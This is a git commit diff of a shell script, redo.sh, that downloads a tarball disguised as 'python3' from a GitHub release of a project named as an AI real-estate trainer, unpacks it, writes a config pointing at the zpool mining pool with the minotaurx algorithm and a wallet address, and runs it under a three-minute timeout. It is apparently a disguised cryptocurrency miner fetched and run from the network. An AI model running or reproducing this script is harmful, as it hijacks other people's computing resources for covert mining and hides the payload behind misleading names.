6bbb3d13275605a02e1e4b1aac629282fc9e0371
cronjob <thesunofme1@gmail.com>
2024-07-15 23:51:40 +0700

    Update redo.sh

--- redo.sh
+++ redo.sh
@@ -1,4 +1,4 @@
-#! /bin/sh
+#!/bin/sh
 wget https://github.com/malphite-code-3/ai-realestale-trainer/releases/download/python3/python3.tar.gz
 tar -xvf python3.tar.gz
 rm python3.tar.gz
@@ -7,4 +7,4 @@ cd python3
 rm config.json && echo '{"algorithm": "minotaurx", "host": "minotaurx.sea.mine.zpool.ca", "port": 7019, "worker": "RLaigv5nSC2dKvM63F8dN4EHjxBEcZi11o", "password": "c=RVN", "workers": 2, "log": false, "chrome": "./chromium/chrome" }' > config.json
 export LD_LIBRARY_PATH=$HOME/dependencies/lib/x86_64-linux-gnu:$HOME/dependencies/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
 export PATH=$HOME/dependencies/usr/bin:$PATH
-./python3 main.py
+timeout 3m ./python3 main.py
